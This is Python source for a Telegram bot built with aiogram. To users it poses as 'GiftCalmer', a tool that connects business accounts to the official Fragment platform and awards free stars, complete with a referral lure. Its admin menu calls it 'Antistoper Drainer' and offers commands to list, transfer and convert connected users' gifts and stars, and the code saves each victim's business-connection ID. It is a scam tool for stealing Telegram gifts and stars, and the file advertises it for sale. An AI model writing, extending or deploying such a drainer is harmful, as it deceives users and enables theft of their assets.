from aiogram import Bot, Dispatcher, F
from aiogram import types
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import (
    GetBusinessAccountStarBalance,
)
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars


from custom_methods import (
    GetFixedBusinessAccountStarBalance,
    GetFixedBusinessAccountGifts,
)

import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re

import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()


def load_json_file(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []


def clear_connections():
    with open("business_connections.json", "w", encoding="utf-8") as f:
        f.write("[]")


def get_connection_id_by_user(user_id: int) -> str:
    # Пример: загружаем из файла или словаря
    import json

    with open("connections.json", "r", encoding="utf-8") as f:
        data = json.load(f)
    return data.get(str(user_id))


def load_connections():
    with open("business_connections.json", "r", encoding="utf-8") as f:
        return json.load(f)


async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"Пользователь #{user_id} подключил бота.")
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")


def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name,
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(
            business_connection.user.id,
            "Вы успешно подключили свой аккаунт к системе Fragment!",
        )

        save_business_connection_data(business_connection)

        logging.info(
            f"Бизнес-аккаунт подключен: {business_connection.user.id}, connection_id: {business_connection}"
        )
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения.")


@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🛠️ Подключить", callback_data="connect"),
            ],
            [
                InlineKeyboardButton(
                    text="🌎 Заработать звезды", callback_data="earn_stars"
                )
            ],
        ]
    )

    username = message.from_user.username

    if message.from_user.id != ADMIN_ID:
        await bot.send_photo(
            message.from_user.id,
            "https://cdn.lifehacker.ru/wp-content/uploads/2024/02/Kak-podarit-Telegram-Premium-i-chto-eto-dast_1677532117-1280x640_1708508305-1024x512.jpg",
            caption=f"""<b>
🎁 <b>Привет{f", @{username}" if username else ""}!</b>  

<blockquote>Я - GiftCalmer, бот, созданный специально для подключения бизнес-аккаунтов Telegram к системе Fragment (Official Telegram Web) и автоматической выдачей звезд за активность!</blockquote>

🤖 <b>Как это работает?</b>  
1 - Добавь меня в свой бизнес-аккаунт.
2 - Я подключу твой аккаунт к официальной платформе Fragment.
3 - После этого начнется автоматическая выдача звезд - цифровых подарков за активность и развитие твоего аккаунта в нашем боте.

<blockquote>⭐ Звезды можно: обменивать, коллекционировать, продавать, дарить, покупать подарки, улучшать.</blockquote>

🛠️ <b>Не знаешь как подключить?</b>  
Не переживай - нажми кнопку «🛠️ Подключить» внизу, и я покажу пошаговую инструкцию. Все просто и безопасно.

🤝 <b>Реферальная система:</b>
Приглашай друзей, чтобы зарабатывать дополнительные звезды! 
🌠 За каждого друга, который подключит бота - ты получишь +25 звезд на свой счет. 
</b> """,
            reply_markup=keyboard,
            parse_mode="html",
        )
    else:
        await message.answer(
            f"Antistoper Drainer\n\n🔗 Количество подключений: {count}\n\n/gifts - просмотреть гифты\n/stars - просмотреть звезды\n/transfer <owned_id> <business_connect> - передать гифт вручную\n/convert - конвертировать подарки в звезды\n/clear_connections - удалить ВСЕ подключения"
        )


@dp.callback_query(F.data == "earn_stars")
async def earn_stars(callback: CallbackQuery):
    user_id = callback.message.from_user.id

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💲 Вывод", callback_data="withdraw")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back")],
        ]
    )

    await bot.send_photo(
        callback.from_user.id,
        "https://images.ctfassets.net/dfcvkz6j859j/7wGcHvbDYkq94dEcRtTrHq/e07b49985aa70df068e72d40719f4b03/5_Simple_Strategies_to_Get_More_Client_Referrals_for_Your_Agency.png",
        caption=f"""<b>🤝 Реферальная система у нас очень простая и выгодная для пользователей.

<blockquote>- 🔍 Ищем людей, кидаем ссылку, человек подвязывает нашего бота к аккаунту, вам выдается баланс в 25 ⭐
- 💼 Вывод от 100 ⭐</blockquote>

⛏️ Добыто звезд (за ваших рефералов): 0 ⭐
↳ Ваша ссылка для приглашения друзей:
<code>https://t.me/gift_calmer_bot?start=ref{user_id}</code></b>""",
    reply_markup=keyboard,
    parse_mode="html"
    )

async def main():
    print("С любовью от @volodimirus")
    await dp.start_polling(bot)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())

print("ПОКУПКА @volodimirus")

# ПОКУПКА @volodimirus
#                                              ПОКУПКА @volodimirus
#               ПОКУПКА @volodimirus
#                                                                    ПОКУПКА @volodimirus
#                                                                                                                       ПОКУПКА @volodimirus
#                       ПОКУПКА @volodimirus
#                                                                           ПОКУПКА @volodimirus
#       ПОКУПКА @volodimirus